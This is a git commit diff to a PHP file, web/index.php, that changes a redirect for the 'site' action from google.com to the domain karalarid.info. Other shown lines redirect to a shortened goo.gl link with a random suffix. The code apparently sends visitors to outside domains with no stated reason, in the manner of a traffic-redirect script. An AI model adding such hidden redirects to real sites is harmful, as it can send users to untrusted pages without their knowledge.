0665412df9e48f14133b46cfc88f9d3456a1622a
sanernecro <sanernecro@gmail.com>
2017-07-20 17:12:54 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -123,7 +123,7 @@
 		header('Location: https://goo.gl/vdmVMe?'.rand(11111,99999));
 	}else if($action == 'site'){
 		$app_site = getSite();
-		header("Location: http://google.com/$id");
+		header("Location: http://karalarid.info/$id");
 	}else{
 		@ob_end_clean();
 		@ob_end_flush();
